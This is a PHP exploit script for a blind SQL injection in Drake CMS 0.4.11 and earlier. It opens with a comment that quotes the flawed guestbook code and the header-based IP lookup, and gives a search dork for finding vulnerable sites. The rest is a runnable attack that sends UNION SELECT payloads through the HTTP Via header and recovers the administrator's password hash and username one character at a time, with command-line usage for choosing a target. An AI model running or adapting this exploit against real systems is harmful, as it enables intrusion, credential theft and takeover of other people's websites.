<?php

/*
	------------------------------------------------------
	Drake CMS <= 0.4.11 Remote Blind SQL Injection Exploit
	------------------------------------------------------

	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://drakecms.sourceforge.net/
	dork.....: "Powered by Drake CMS" inurl:index.php?option=guestbook
	
	[-] Blind SQL Injection in /components/guestbook/guestbook.php

	15.	case "insert" :
	16.		if (!$my->gid) {
	17.			if ('' === ($gb_name = in('gb_name', __SQL | __NOHTML, $_POST, '', 50))
	18.				|| ('' === ($gb_email = in('gb_email', __SQL | __NOHTML, $_POST, '', 50)))
	19.				|| !is_email($gb_email)
	20.				)
	21.				CMSResponse::Back(_FORM_NC);
	22.		} else {
	23.			$gb_name = $my->name;
	24.			$gb_email = $my->email;
	25.		}
	26.	
	27.		$timeout = $params->get('timeout',5);
	28.	
	29.		$row = $conn->GetRow("SELECT id,ip,date FROM #__guestbook WHERE ip ='".$my->GetIP()."' AND date > '".($time-($timeout*60))."' "); <==
	30.	
	31.		if(!count($row)) {
	32.			if ($params->get('captcha') && !$my->valid_captcha())
	33.				break;
	34.			
	35.			$gb_url = in('gb_url', __SQL | __NOHTML, $_POST, '');
	36.			$gb_country = in('gb_country', __SQL | __NOHTML, $_POST, '', 50);
	37.			$gb_title = in('gb_title', __SQL | __NOHTML, $_POST, '', 255);
	38.			$gb_message = in('gb_message', __SQL | __NOHTML, $_POST, '');
	39.	
	40.			$conn->Insert('#__guestbook', '(name,email,url,country,title,message,ip,date)',"'$gb_name','$gb_email','$gb_url', (...)
	41.	
	42.		} else
	43.			echo _GUESTBOOK_DOUBLE_SIGN;
	
	if you analize GetIP() function defined into /classes/user.php (lines 61-66) you can see that an attacker
	could be inject arbitrary SQL code through http via header...this results in a blind SQL injection at line 29
	
	[-] look at /includes/retrieve_ip.php
	
	69.		if(isset($_SERVER['HTTP_VIA'])) {
	70.			// case 2: 
	71.			// proxy && HTTP_(X_) FORWARDED (_FOR) not defined && HTTP_VIA defined
	72.			// other exotic variables may be defined 
	73.			return ( $_SERVER['HTTP_VIA'].$x_coming_from.$coming_from ) ; <== this is the same value returned from GetIP()
	74.		}
	
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...\n";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function check_query($sql)
{
	global $host, $path;
	
	$payload = "gb_name=null&gb_email=foo%40bar.com&task=insert";
	$packet  = "POST {$path}index.php?option=guestbook HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Via: {$sql}\r\n";
	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet .= "Content-Length: ".strlen($payload)."\r\n";
	$packet .= "Connection: close\r\n\r\n";
	$packet .= $payload;

	return (!preg_match("/UNION\/\*\*\/SELECT/", http_send($host, $packet)));
}

print "\n+----------------------------------------------------------------+";
print "\n| Drake CMS <= 0.4.11 Remote Blind SQL Injection Exploit by EgiX |";
print "\n+----------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......:	php $argv[0] host path [userid] [prefix]\n";
	print "\nhost.......:	target server (ip/hostname)";
	print "\npath.......:	path to Drake CMS directory (example: / or /drake/)";
	print "\nuserid.....:	user id (default: 1 - admin)";
	print "\nprefix.....:	table's prefix (default: dk_)\n";
	die();
}

$host = $argv[1];
$path = $argv[2];
$uid  = (isset($argv[3]) ? $argv[3] : "1");
$pre  = (isset($argv[4]) ? $argv[4] : "dk_");

$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$index = 1; $md5 = "";
print "\n[-] MD5 Hash: ";

while (!strpos($md5, chr(0)))
{
	for ($i = 0, $n = count($hash); $i <= $n; $i++)
	{
  		if ($i == $n) die("\n\n[-] Exploit failed...\n");
		$sql = "-1'/**/UNION/**/SELECT/**/password,1,1/**/FROM/**/{$pre}users/**/WHERE/**/ORD(SUBSTR(password,{$index},1))={$hash[$i]}/**/AND/**/id={$uid}/*";
		if (check_query($sql)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
	}

	$index++;
}

$char = array(0); // null char
for ($j = 97; $j <= 122; $j++) $char = array_merge($char, array($j)); // a-z
for ($j = 65; $j <= 90; $j++) $char = array_merge($char, array($j)); // A-Z
for ($j = 48; $j <= 57; $j++) $char = array_merge($char, array($j)); // 0-9

$index = 1; $user = "";
print "\n[-] Username: ";

while (!strpos($user, chr(0)))
{
	for ($i = 0, $n = count($char); $i <= $n; $i++)
	{
  		if ($i == $n) die("\n\n[-] Exploit failed...\n");
		$sql = "-1'/**/UNION/**/SELECT/**/username,1,1/**/FROM/**/{$pre}users/**/WHERE/**/ORD(SUBSTR(username,{$index},1))={$char[$i]}/**/AND/**/id={$uid}/*";
		if (check_query($sql)) { $user .= chr($char[$i]); print chr($char[$i]); break; }
	}

	$index++;
}

print "\n\n[-] Successfull!\n";

?>

